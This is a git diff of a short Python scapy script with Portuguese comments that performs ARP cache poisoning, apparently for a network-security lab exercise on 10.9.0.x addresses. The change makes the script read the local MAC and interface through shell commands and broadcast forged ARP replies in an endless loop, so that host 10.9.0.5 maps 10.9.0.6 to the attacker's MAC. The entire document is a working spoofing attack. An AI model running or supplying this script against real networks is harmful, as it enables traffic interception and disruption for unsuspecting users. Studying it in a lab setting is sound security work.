@@ -1,23 +1,30 @@
 import scapy.all as scapy
-from uuid import getnode as getmac
+import subprocess
+import time
 
+# Funcao que pega o endereco MAC local pra enviar no pacote ARP
 def get_localmac():
-   try:
-      mac = open('/sys/class/net/br-8ab3e65214d4/address').readline()
-   except:
-      mac = "00:00:00:00:00:00"
-   return mac[0:17]
+   result = subprocess.run("ifconfig -a | sed '4!d' | cut -b 15-31", stdout=subprocess.PIPE, shell=True)
+   return result.stdout.decode().strip("\n")
 
-# we will send the packet to the target by pretending being the spoofed
+# Pega interface de envio
+def get_iface():
+   result = subprocess.run("ifconfig -a | sed '1!d' | cut -d ':' -f1", stdout=subprocess.PIPE, shell=True)
+   return result.stdout.decode().strip("\n")
+
+# Vamos mandar um pacote para a vitima dizendo que o IP que queremos forjar tem nosso MAC
 def spoof(mac, spoofed_src, dest):
    pkt=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=dest, hwsrc=mac, psrc=spoofed_src)
    # pkt.show()
-   scapy.sendp(pkt, iface="br-8ab3e65214d4", verbose=False)
+   scapy.sendp(pkt, iface=get_iface(), verbose=False)
 
 def main():
    mac = get_localmac()
-   spoof(mac, "10.9.0.6", "10.9.0.5")
-   print(f'Pacote ARP enviado! 10.9.0.5 agora acha que somos o 10.9.0.6!')
+   while True:
+      spoof(mac, "10.9.0.6", "10.9.0.5")
+      # spoof("02:42:0a:09:00:06", "10.9.0.5", "10.9.0.6")
+      # time.sleep(10)
+   # print(f'Pacote ARP enviado! 10.9.0.5 agora acha que somos o 10.9.0.6!')
 
 if __name__ == "__main__":
    main()
